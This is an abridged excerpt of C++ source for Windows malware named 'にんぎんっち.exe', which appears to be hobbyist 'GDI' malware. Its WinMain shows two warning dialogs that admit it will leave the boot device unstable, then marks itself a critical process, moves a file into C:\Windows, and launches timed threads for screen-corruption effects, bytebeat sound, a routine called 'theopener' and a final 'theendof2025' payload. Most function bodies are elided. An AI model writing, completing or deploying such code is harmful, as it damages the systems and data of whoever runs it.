// にんぎんっち.cpp : Defines the entry point for the application.
//
...
DWORD WINAPI moveself(LPVOID lpParam) {
	...
	MoveFileA(pathdel, "C:\\Windows\\VERITASSAPIENTIAE");
	return 1;
}
...
int WINAPI WinMain(HINSTANCE hia,
	...
	if (MessageBoxW(NULL, L"Fair Warning!, Run A Malware For Sure?, \nAre you sure to run dangerous malware, you will unstable boot device,\n do you run during a malware, for an test malware? \n Are You Sure?", L"にんぎんっち.exe (Made By PhongDangCPP/P. ĐĂNG & N17Pro3426)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"This Is The Last Warning!, Are You Sure? \nthe creator will not be responsible for any of the damage caused!", L"にんぎんっち.exe (Made By PhongDangCPP/P. ĐĂNG & N17Pro3426)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			...
			Sleep(1000);
			payloadhandle gdi03 = CreateThread(0, 0, ball666, 0, 0, 0);
			...
			CloseHandle(gdi7);
			TerminateThread(gdi03, 0);
			CloseHandle(gdi03);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			payloadhandle gdi8 = CreateThread(0, 0, p8::GDI, 0, 0, 0);
			payloadhandle gdi04 = CreateThread(0, 0, text666, 0, 0, 0);
			bytebeat::sfx8();
			Sleep(30000);
			...
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			payloadhandle gdi12 = CreateThread(0, 0, p12::GDI, 0, 0, 0);
			payloadhandle systemop = CreateThread(0, 0, theopener, 0, 0, 0);
			bytebeat::sfx12();
			Sleep(30000);
			TerminateThread(gdi12, 0);
			CloseHandle(gdi12);
			TerminateThread(gdi04, 0);
			CloseHandle(gdi04);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			payloadhandle theend = CreateThread(0, 0, theendof2025, 0, 0, 0);
			// gdi end
